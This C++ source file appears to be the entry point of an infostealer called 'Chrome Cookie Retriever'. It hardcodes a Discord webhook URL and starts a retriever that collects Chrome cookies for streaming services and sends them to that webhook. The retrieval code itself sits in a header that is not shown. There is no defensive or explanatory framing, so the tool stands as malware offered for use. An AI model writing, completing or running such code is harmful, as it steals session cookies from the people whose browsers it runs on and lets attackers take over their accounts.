#include "chrome_cookie_retriever.hpp"
#include <iostream>
#include <string>

// Replace this with your Discord webhook URL
const char* DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1307465181974233200/KYQo4T58xjkQ9Kkw6m22EXZFFWtjp-CEZbi7nnnh-gGkxu2nPg9SAW0ALkShdtdOXxtS";

int main(int argc, char* argv[]) {
    try {
        std::cout << "Starting Cookie Retriever...\n" << std::endl;
        
        std::string webhook_url;
        if (DISCORD_WEBHOOK_URL != nullptr) {
            webhook_url = DISCORD_WEBHOOK_URL;
        }
        
        cookie_retriever::ChromeCookieRetriever retriever(webhook_url);
        retriever.retrieve_cookies("");  // No domain needed, will get all streaming service cookies
        
        return 0;
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    } catch (...) {
        std::cerr << "Unknown error occurred" << std::endl;
        return 1;
    }
}
